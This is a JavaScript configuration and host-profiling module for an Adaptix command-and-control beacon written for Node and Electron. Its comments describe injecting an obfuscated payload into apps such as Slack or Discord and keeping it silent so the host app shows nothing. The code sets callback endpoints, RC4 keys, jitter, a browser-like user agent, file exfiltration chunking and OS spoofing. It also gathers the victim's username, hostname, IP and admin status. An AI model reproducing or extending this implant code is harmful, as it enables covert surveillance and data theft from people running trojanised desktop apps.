// config.js — Adaptix HTTP beacon agent configuration.
// In production this would be baked into the obfuscated payload (see Loki's
// create_agent_payload.js). For dev we load from a JSON file or env.
//
// All values mirror the Adaptix HTTP listener's config fields so the beat
// matches what the server (extenders/beacon_listener_http/pl_transport.go)
// expects.
//
//   encrypt_key   : 32 hex chars = 16-byte RC4 key (NOT base64, NOT a passphrase)
//   agent_type    : 0xBE4C0149 == the "beacon" agent watermark
//                   (AdaptixC2/AdaptixServer/extenders/beacon_agent/config.yaml
//                    agent_watermark: "be4c0149")

const fs = require('fs');
const path = require('path');
const os = require('os');
const cp = require('child_process');
const DEFAULTS = {
  // ---- transport (match listener config) ----
  host: '127.0.0.1',
  port: 443,
  // multiple callback endpoints, like the real beacon's ProfileHTTP
  // (servers[]/ports[] + rotation_mode). Entries are "host:port" strings;
  // when non-empty these take precedence over host/port.
  //   sequential: stay on one endpoint, fail over to the next on connect error
  //   random:     pick a random endpoint every tick (C++ rotation_mode=1)
  hosts: [],
  rotation: 'sequential',
  ssl: false,                  // false=http(true on real server via ssl_gen.sh)
  // exfiltration chunk size in bytes (profile download.chunksize in the real
  // beacon defaults to 128000); download pump reads this much per tick
  file_chunk_size: 0x80000,
  http_method: 'POST',         // GET or POST
  uri: '/content.html',        // one of the listener's configured uris
  user_agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
  hb_header: 'X-Beacon-Id',    // the "parameter" / beat header name
  encrypt_key: '00112233445566778899aabbccddeeff', // 16 bytes

  // ---- beacon timing (seconds) ----
  sleep_delay: 5,
  jitter_delay: 15,

  // ---- noise ----
  // console logging (dev convenience). Injected payloads ship a sidecar with
  // "debug": false so the host app never sees output; ADAPTIX_DEBUG=1 forces
  // it back on for lab runs.
  debug: true,

  // ---- identity ----
  agent_type: 0xbe4c0149,
  agent_id: 'auto',            // 'auto' = random per run; set fixed to be stable
  // RC4 session key for the task channel, 32 hex chars. The server reads it
  // from the FIRST beat only (TsAgentCreate) and never re-learns it — so a
  // FIXED agent id must reuse ONE key across relaunches. The agent persists
  // a generated key into the sidecar (config file) on first run and reuses it
  // after; null => generate fresh (random ids don't need persistence).
  session_key: null,

  // ---- os spoof (lab: make the server attach the Windows command group) ----
  // null = real host info; or {major, minor, build} e.g. {10,0,22631} = Win 11
  os_spoof: null,

  // ---- overrides for host metadata shown in dashboard ----
  computer_name: null,         // null => os.hostname()
  domain_name: null,
  process_name: null,          // null => electron.exe style name

  // ---- interactive session channel (push-style WebSocket, see wslink.js) ----
  // null = disabled (HTTP beacon only). Or {url, key}:
  //   "ws": { "url": "ws://relay:8765/tunnel", "key": "<32 hex chars>" }
  // The key is the WS channel key (independent of encrypt_key/session_key).
  ws: null,
};

function load() {
  const cfg = { ...DEFAULTS };
  let loadedFile = null;

  // 0) build-time baked config (self-contained "PE-style" payloads): injected
  //    by scripts/build_payload.js --bake <file>. Sits BELOW sidecar/env so a
  //    sidecar can still repoint a baked payload without rebuilding.
  if (typeof globalThis !== 'undefined' && globalThis.__ADAPTIX_BAKED__) {
    Object.assign(cfg, globalThis.__ADAPTIX_BAKED__);
  }

  // 1) file overrides, in order: $ADAPTIX_CONFIG, sidecar NEXT TO THIS FILE
  //    (when bundled, the payload + its sidecar sit together in the target's
  //    resources/app), then the legacy dev location ../adapter.config.json
  const sidecars = [
    process.env.ADAPTIX_CONFIG,
    path.join(__dirname, 'adpt.config.json'),
    path.join(__dirname, '..', 'adapter.config.json'),
  ].filter(Boolean);
  for (const p of sidecars) {
    if (fs.existsSync(p)) {
      try { Object.assign(cfg, JSON.parse(fs.readFileSync(p, 'utf8'))); loadedFile = p; } catch (_) { /* bad json -> defaults */ }
      break;
    }
  }
  cfg.__file = loadedFile; // where this config came from (session-key persistence)
  cfg.agent_id_explicit = cfg.agent_id !== 'auto';

  // 2) env overrides
  if (process.env.ADAPTIX_HOST) cfg.host = process.env.ADAPTIX_HOST;
  if (process.env.ADAPTIX_PORT) cfg.port = parseInt(process.env.ADAPTIX_PORT, 10);
  if (process.env.ADAPTIX_KEY) cfg.encrypt_key = process.env.ADAPTIX_KEY;
  if (process.env.ADAPTIX_SSL !== undefined) cfg.ssl = process.env.ADAPTIX_SSL === '1' || process.env.ADAPTIX_SSL === 'true';
  if (process.env.ADAPTIX_SLEEP) cfg.sleep_delay = parseInt(process.env.ADAPTIX_SLEEP, 10);
  if (process.env.ADAPTIX_JITTER) cfg.jitter_delay = parseInt(process.env.ADAPTIX_JITTER, 10);
  if (process.env.ADAPTIX_URI) cfg.uri = process.env.ADAPTIX_URI;
  if (process.env.ADAPTIX_HB_HEADER) cfg.hb_header = process.env.ADAPTIX_HB_HEADER;
  if (process.env.ADAPTIX_USER_AGENT) cfg.user_agent = process.env.ADAPTIX_USER_AGENT;
  if (process.env.ADAPTIX_METHOD) cfg.http_method = process.env.ADAPTIX_METHOD;
  if (process.env.ADAPTIX_DEBUG === '1') cfg.debug = true;
  if (process.env.ADAPTIX_HOSTS) cfg.hosts = String(process.env.ADAPTIX_HOSTS).split(',').map((s) => s.trim()).filter(Boolean);
  if (process.env.ADAPTIX_ROTATION) cfg.rotation = process.env.ADAPTIX_ROTATION;
  if (process.env.ADAPTIX_CHUNK) cfg.file_chunk_size = parseInt(process.env.ADAPTIX_CHUNK, 10) || cfg.file_chunk_size;

  // interactive WS channel: sidecar {url,key} or ADAPTIX_WS_URL + ADAPTIX_WS_KEY
  const wsUrl = (cfg.ws && cfg.ws.url) || process.env.ADAPTIX_WS_URL;
  const wsKey = (cfg.ws && cfg.ws.key) || process.env.ADAPTIX_WS_KEY;
  cfg.ws = null;
  if (wsUrl && wsKey) {
    if (/^[0-9a-fA-F]{32}$/.test(String(wsKey))) cfg.ws = { url: String(wsUrl), key: String(wsKey) };
    else if (cfg.debug) console.error('[config] ws key must be 32 hex chars — interactive channel disabled');
  }

  // ---- callback endpoint normalization (real beacon: servers[] + ports[]) --
  cfg.endpoints = [];
  for (const h of cfg.hosts || []) {
    const m = String(h).match(/^(.+):(\d+)$/);
    if (m) cfg.endpoints.push({ host: m[1], port: parseInt(m[2], 10) });
  }
  if (!cfg.endpoints.length) cfg.endpoints = [{ host: cfg.host, port: cfg.port }];
  if (cfg.rotation !== 'random') cfg.rotation = 'sequential';
  if (process.env.ADAPTIX_OS_SPOOF) {
    const map = { win7: [6, 1, 7601], win10: [10, 0, 19045], win11: [10, 0, 22631], win2022: [10, 0, 20348] };
    const v = map[String(process.env.ADAPTIX_OS_SPOOF).toLowerCase()];
    if (v) cfg.os_spoof = { major: v[0], minor: v[1], build: v[2] };
  }

  // normalize key to 16 bytes
  if (cfg.encrypt_key.length !== 32) throw new Error('encrypt_key must be 32 hex chars (16 bytes), got ' + cfg.encrypt_key.length);
  if (!/^[0-9a-fA-F]{32}$/.test(cfg.encrypt_key)) throw new Error('encrypt_key must be hex');
  // session key: never throw (injected payloads must stay silent on bad input)
  if (cfg.session_key !== null && (typeof cfg.session_key !== 'string' || !/^[0-9a-fA-F]{32}$/.test(cfg.session_key))) {
    cfg.session_key = null;
  }
  if (cfg.agent_id === 'auto') {
    cfg.agent_id = ((Math.floor(Math.random() * 0xffff) << 16) | Math.floor(Math.random() * 0x10000)) >>> 0;
  } else if (typeof cfg.agent_id !== 'number') {
    cfg.agent_id = parseInt(cfg.agent_id, 16) >>> 0;
  }

  return cfg;
}

// host metadata that becomes the agent info the server stores/displays.
// Platform-aware: the SAME code runs on Windows/macOS/Linux (pure Node/Electron).
// The server derives the OS string ("Win 11 x64" etc.) from major/minor/build.
let _elevatedCache = null; // elevation never changes per-tick — see hostInfo

function hostInfo(cfg) {
  const osInfo = os.type(); // 'Windows_NT' | 'Darwin' | 'Linux'
  const rel = (os.release() || '0.0.0').split('.').map((n) => parseInt(n, 10) || 0);
  let major = 10, minor = 0, build = 28000;
  if (cfg.os_spoof) {
    major = cfg.os_spoof.major; minor = cfg.os_spoof.minor; build = cfg.os_spoof.build;
  } else if (osInfo === 'Windows_NT') {
    // os.release() -> "10.0.22631" (major, minor, build) — maps to Win10/Win11
    major = rel[0] || 10;
    minor = rel[1] || 0;
    build = rel[2] || 0;
  } else if (osInfo === 'Darwin') {
    major = rel[0] || 6;
    minor = rel[1] || 0;
  } else {
    major = rel[0] || 3;
    minor = rel[1] || 0;
  }

  let internal_ip = 0;
  for (const name of Object.keys(os.networkInterfaces())) {
    for (const a of os.networkInterfaces()[name]) {
      if (a.family === 'IPv4' && !a.internal) { internal_ip = ipToLong(a.address); break; }
    }
    if (internal_ip) break;
  }

  // elevation: Windows -> "net session" needs admin; POSIX -> uid 0.
  // Memoized ONCE per process: elevation is process-static, and execSync
  // BLOCKS the main thread — per-tick spawns inside a script-jacked host
  // (Slack's hang watchdog, any Electron app mid-boot) can kill the host app.
  if (_elevatedCache === null) {
    _elevatedCache = false;
    try {
      if (process.platform === 'win32') {
        cp.execSync('net session', { stdio: 'ignore' });
        _elevatedCache = true;
      } else if (typeof process.getuid === 'function') {
        _elevatedCache = process.getuid() === 0;
      }
    } catch (_) { _elevatedCache = false; }
  }
  const elevated = _elevatedCache;

  const arch64 = os.arch().includes('64');
  return {
    os_type: osInfo,
    os_version_raw: os.release(),
    major_version: major,
    minor_version: minor,
    build_number: build,
    internal_ip,
    gmt_offset: -Math.round(new Date().getTimezoneOffset() / 60), // hours, signed
    acp: 1252,                     // Windows ANSI codepage (display only)
    oemcp: 437,
    pid: process.pid,
    tid: 0,                        // best effort; 0 acceptable
    is_server: false,
    elevated,
    sys64: arch64,                 // OS is 64-bit
    arch64,                        // process is 64-bit
    domain_name: cfg.domain_name || (process.platform === 'win32' ? (process.env.USERDOMAIN || os.hostname()) : osInfo),
    computer_name: cfg.computer_name || os.hostname(),
    username: os.userInfo().username,
    // in Electron, process.execPath is the app binary (e.g. Discord.exe) —
    // exactly what the real beacon reports; plain Node gives node/node.exe.
    process_name: cfg.process_name || path.basename(process.execPath),
  };
}

function ipToLong(ip) {
  const p = ip.split('.').map((n) => parseInt(n, 10) & 0xff);
  return (((p[0] << 24) | (p[1] << 16) | (p[2] << 8) | p[3]) >>> 0).toString();
}

module.exports = { load, hostInfo, DEFAULTS };
